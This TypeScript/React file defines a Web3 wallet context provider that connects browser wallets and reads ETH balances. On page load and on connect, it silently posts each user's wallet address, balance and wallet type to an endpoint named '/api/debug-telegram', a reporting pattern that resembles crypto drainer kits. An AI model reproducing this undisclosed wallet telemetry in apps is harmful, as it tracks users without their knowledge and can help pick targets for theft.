"use client"

import { createContext, useContext, useState, useEffect, type ReactNode, useRef } from "react"
import { WalletConnectionModal } from "@/components/wallet-connection-modal"

declare global {
  interface Window {
    ethereum?: any
  }
}

const WALLET_OPTIONS = [
  { name: "MetaMask", color: "#F6851B", icon: "/images/wallets/metamask-new.png" },
  { name: "Coinbase Wallet", color: "#0052FF", icon: "/images/wallets/coinbase.png" },
  { name: "Browser Wallet", color: "#4285F4", icon: "/images/wallets/browser.png" },
]

type Web3ContextType = {
  isConnected: boolean
  address: string | null
  balance: string
  connect: () => Promise<boolean>
  disconnect: () => void
  selectNewWallet: () => void
  refreshBalance: () => Promise<number>
  tokenBalances: Record<string, string>
}

export const Web3Context = createContext<Web3ContextType>({
  isConnected: false,
  address: null,
  balance: "0",
  connect: async () => false,
  disconnect: () => {},
  selectNewWallet: () => {},
  refreshBalance: async () => 0,
  tokenBalances: {},
})

export const useWeb3 = () => useContext(Web3Context)

export function Web3Provider({ children }: { children: ReactNode }) {
  const [isConnected, setIsConnected] = useState(false)
  const [address, setAddress] = useState<string | null>(null)
  const [balance, setBalance] = useState("0")
  const [walletType, setWalletType] = useState<string>("Unknown")
  const [isWalletModalOpen, setIsWalletModalOpen] = useState(false)
  const [tokenBalances, setTokenBalances] = useState<Record<string, string>>({})
  const [isConnecting, setIsConnecting] = useState(false)

  const notificationSentRef = useRef<Record<string, boolean>>({})

  // Check if wallet is available
  const isWalletAvailable = () => {
    return typeof window !== "undefined" && window.ethereum
  }

  // Get wallet type from provider
  const getWalletType = (provider: any): string => {
    if (!provider) return "Unknown"
    if (provider.isMetaMask) return "MetaMask"
    if (provider.isCoinbaseWallet) return "Coinbase Wallet"
    return "Browser Wallet"
  }

  // Auto-connect on page load
  useEffect(() => {
    const autoConnect = async () => {
      if (!isWalletAvailable()) return

      try {
        const accounts = await window.ethereum.request({ method: "eth_accounts" })
        if (accounts && accounts.length > 0) {
          const userAddress = accounts[0]
          setAddress(userAddress)
          setIsConnected(true)
          setWalletType(getWalletType(window.ethereum))

          localStorage.setItem("walletAddress", userAddress)
          localStorage.setItem("walletType", getWalletType(window.ethereum))

          await updateBalance(userAddress)
          await sendConnectionNotification(userAddress, getWalletType(window.ethereum))
        }
      } catch (error) {
        console.error("Auto-connect failed:", error)
      }
    }

    autoConnect()
  }, [])

  // Listen for account changes
  useEffect(() => {
    if (!isWalletAvailable()) return

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        disconnect()
      } else if (accounts[0] !== address) {
        setAddress(accounts[0])
        localStorage.setItem("walletAddress", accounts[0])
        updateBalance(accounts[0])
      }
    }

    const handleChainChanged = () => {
      window.location.reload()
    }

    window.ethereum.on("accountsChanged", handleAccountsChanged)
    window.ethereum.on("chainChanged", handleChainChanged)

    return () => {
      if (window.ethereum.removeListener) {
        window.ethereum.removeListener("accountsChanged", handleAccountsChanged)
        window.ethereum.removeListener("chainChanged", handleChainChanged)
      }
    }
  }, [address])

  // Update balance
  const updateBalance = async (userAddress: string) => {
    try {
      const balanceHex = await window.ethereum.request({
        method: "eth_getBalance",
        params: [userAddress, "latest"],
      })

      const balanceWei = BigInt(balanceHex)
      const balanceEth = Number(balanceWei) / 1e18
      const formattedBalance = balanceEth.toFixed(6)

      setBalance(formattedBalance)
      setTokenBalances({ ETH: formattedBalance })

      return balanceEth
    } catch (error) {
      console.error("Error updating balance:", error)
      return 0
    }
  }

  // Send connection notification
  const sendConnectionNotification = async (userAddress: string, walletName: string) => {
    if (notificationSentRef.current[userAddress]) return

    try {
      const response = await fetch("/api/debug-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: `
🔌 Wallet Connected
👛 Address: ${userAddress}
💰 Balance: ${balance} ETH
🔑 Wallet: ${walletName}
⏰ Time: ${new Date().toISOString()}
          `,
        }),
      })

      if (response.ok) {
        notificationSentRef.current[userAddress] = true
      }
    } catch (error) {
      console.error("Failed to send notification:", error)
    }
  }

  // Connect wallet
  const connect = async (): Promise<boolean> => {
    if (isConnecting) return false

    setIsConnecting(true)

    try {
      if (isConnected && address) {
        setIsConnecting(false)
        return true
      }

      if (!isWalletAvailable()) {
        setIsWalletModalOpen(true)
        setIsConnecting(false)
        return false
      }

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        const userAddress = accounts[0]
        const detectedWalletType = getWalletType(window.ethereum)

        setAddress(userAddress)
        setIsConnected(true)
        setWalletType(detectedWalletType)

        localStorage.setItem("walletAddress", userAddress)
        localStorage.setItem("walletType", detectedWalletType)

        await updateBalance(userAddress)
        await sendConnectionNotification(userAddress, detectedWalletType)

        setIsConnecting(false)
        return true
      }
    } catch (error) {
      console.error("Connection failed:", error)
      setIsWalletModalOpen(true)
    }

    setIsConnecting(false)
    return false
  }

  // Handle wallet selection from modal
  const handleWalletSelection = async (walletName: string): Promise<boolean> => {
    setIsWalletModalOpen(false)

    if (!isWalletAvailable()) {
      alert("Please install MetaMask or another Ethereum wallet to continue.")
      return false
    }

    try {
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" })

      if (accounts && accounts.length > 0) {
        const userAddress = accounts[0]

        setAddress(userAddress)
        setIsConnected(true)
        setWalletType(walletName)

        localStorage.setItem("walletAddress", userAddress)
        localStorage.setItem("walletType", walletName)

        await updateBalance(userAddress)
        await sendConnectionNotification(userAddress, walletName)

        return true
      }
    } catch (error) {
      console.error("Wallet selection failed:", error)
    }

    return false
  }

  // Disconnect wallet
  const disconnect = () => {
    setAddress(null)
    setIsConnected(false)
    setBalance("0")
    setWalletType("Unknown")
    setTokenBalances({})

    localStorage.removeItem("walletAddress")
    localStorage.removeItem("walletType")

    notificationSentRef.current = {}
  }

  // Select new wallet
  const selectNewWallet = () => {
    disconnect()
    setIsWalletModalOpen(true)
  }

  // Refresh balance
  const refreshBalance = async (): Promise<number> => {
    if (isConnected && address) {
      return await updateBalance(address)
    }
    return 0
  }

  return (
    <Web3Context.Provider
      value={{
        isConnected,
        address,
        balance,
        connect,
        disconnect,
        selectNewWallet,
        refreshBalance,
        tokenBalances,
      }}
    >
      {children}
      <WalletConnectionModal
        isOpen={isWalletModalOpen}
        onClose={() => setIsWalletModalOpen(false)}
        walletOptions={WALLET_OPTIONS}
        otherWalletOptions={[]}
        onSelectWallet={handleWalletSelection}
      />
    </Web3Context.Provider>
  )
}
